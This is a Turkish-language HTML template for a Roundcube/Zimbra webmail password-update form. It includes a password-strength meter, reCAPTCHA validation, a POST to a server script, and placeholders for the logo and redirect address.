<!DOCTYPE html>
<html lang="tr">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
  <title>Roundcube/Zimbra Pasforce - Şifre Güncelleme</title>
  <link rel="shortcut icon" href="favicon.ico" />
  <link
    rel="stylesheet"
    href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
  />
  <style>
    body {
      background-color: #f4f4f4;
    }

    .container {
      max-width: 420px;
      margin: 40px auto;
      padding: 30px;
      background-color: white;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
    }

    #logo {
      display: block;
      margin: 0 auto 20px;
      max-width: 100%;
      height: auto;
    }

    #password-strength {
      height: 8px;
      border-radius: 5px;
    }

    ul#password-rules {
      font-size: 0.9rem;
      padding-left: 20px;
      margin-top: 10px;
      color: #555;
    }

    @media (max-width: 576px) {
      .container {
        padding: 20px;
        margin: 20px;
      }

      h5 {
        font-size: 1.1rem;
      }

      ul#password-rules {
        font-size: 0.85rem;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <img
      src="logo linki buraya gelecek"
      id="logo"
      alt="Logo"
      width="140"
    />
    <h5 class="text-center mb-4">Şifre Güncelleme Formu</h5>

    <div id="form-alert"></div>

    <form id="login-form" method="post" action="islem.php">
      <div class="form-group">
        <label for="rcmloginuser">Mail Adresiniz:</label>
        <input
          type="email"
          name="mail"
          id="rcmloginuser"
          class="form-control"
          required
        />
      </div>

      <div class="form-group">
        <label for="current_password">Mevcut Parolanız:</label>
        <input
          type="password"
          name="current_password"
          id="current_password"
          class="form-control"
          required
        />
      </div>

      <div class="form-group">
        <label for="new_password">Yeni Parolanız:</label>
        <input
          type="password"
          name="new_password"
          id="new_password"
          class="form-control"
          required
          oninput="updatePasswordStrength()"
        />
        <div class="progress mt-2">
          <div
            class="progress-bar"
            id="password-strength"
            role="progressbar"
          ></div>
        </div>
        <small id="strength-text" class="form-text text-muted mt-1"></small>
        <ul id="password-rules">
          <li>En az 8 karakter olmalı</li>
          <li>Büyük harf içermeli (A–Z)</li>
          <li>Küçük harf içermeli (a–z)</li>
          <li>Rakam içermeli (0–9)</li>
          <li>Özel karakter içermeli (! @ # $ % & * vb.)</li>
        </ul>
      </div>

      <div class="form-group">
        <label for="confirm_password">Yeni Parolanız (Tekrar):</label>
        <input
          type="password"
          name="confirm_password"
          id="confirm_password"
          class="form-control"
          required
        />
      </div>

      <!-- Google reCAPTCHA widget -->
      <div class="form-group">
        <div class="g-recaptcha" data-sitekey="recaptcha public key buraya yaz"></div>
      </div>

      <button type="submit" class="btn btn-primary btn-block">
        Şifreyi Güncelle
      </button>
    </form>

    <p class="text-center mt-4 text-muted">
      Yeni şifreniz işlem sonrası erişim sağlayabilirsiniz.
    </p>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script
    src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"
  ></script>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>

  <script>
    function showAlert(message, type = "danger") {
      document.getElementById("form-alert").innerHTML = `
        <div class="alert alert-${type} alert-dismissible fade show" role="alert">
          ${message}
          <button type="button" class="close" data-dismiss="alert">&times;</button>
        </div>`;
    }

    function getPasswordScore(password) {
      let score = 0;
      if (password.length >= 8) score++;
      if (/[a-z]/.test(password)) score++;
      if (/[A-Z]/.test(password)) score++;
      if (/[0-9]/.test(password)) score++;
      if (/[^A-Za-z0-9]/.test(password)) score++;
      return score;
    }

    function updatePasswordStrength() {
      const password = document.getElementById("new_password").value;
      const bar = document.getElementById("password-strength");
      const text = document.getElementById("strength-text");
      const score = getPasswordScore(password);

      const levels = [
        { width: "20%", color: "bg-danger", label: "Çok Zayıf" },
        { width: "40%", color: "bg-warning", label: "Zayıf" },
        { width: "60%", color: "bg-info", label: "Orta" },
        { width: "80%", color: "bg-primary", label: "İyi" },
        { width: "100%", color: "bg-success", label: "Güçlü" },
      ];

      const level = levels[Math.min(score, 4)];

      bar.className = `progress-bar ${level.color}`;
      bar.style.width = level.width;
      text.textContent = level.label;
    }

    $("#login-form").on("submit", function (e) {
      e.preventDefault();

      const email = $("#rcmloginuser").val().trim();
      const newPassword = $("#new_password").val();
      const confirmPassword = $("#confirm_password").val();
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (!emailRegex.test(email)) {
        showAlert("Lütfen geçerli bir email adresi girin.");
        return;
      }

      if (newPassword !== confirmPassword) {
        showAlert("Yeni parolalar eşleşmiyor.");
        return;
      }

      if (getPasswordScore(newPassword) < 3) {
        showAlert("Parolanız yeterince güçlü değil. Lütfen kurallara uygun bir parola girin.");
        return;
      }

      // reCAPTCHA doğrulama kontrolü
      const recaptchaResponse = grecaptcha.getResponse();
      if (!recaptchaResponse) {
        showAlert("Lütfen reCAPTCHA doğrulamasını tamamlayınız.");
        return;
      }

      const formData = new FormData(this);

      fetch("islem.php", {
        method: "POST",
        body: formData,
      })
        .then((res) => res.json())
        .then((data) => {
          if (data.success) {
            showAlert(data.message, "success");
            setTimeout(() => {
              window.location.href = "https://siteadresi.com";
            }, 3000);
          } else {
            showAlert(data.message, "danger");
          }
        })
        .catch(() => {
          showAlert("Bir hata oluştu, lütfen tekrar deneyin.", "danger");
        });
    });
  </script>
</body>

</html>
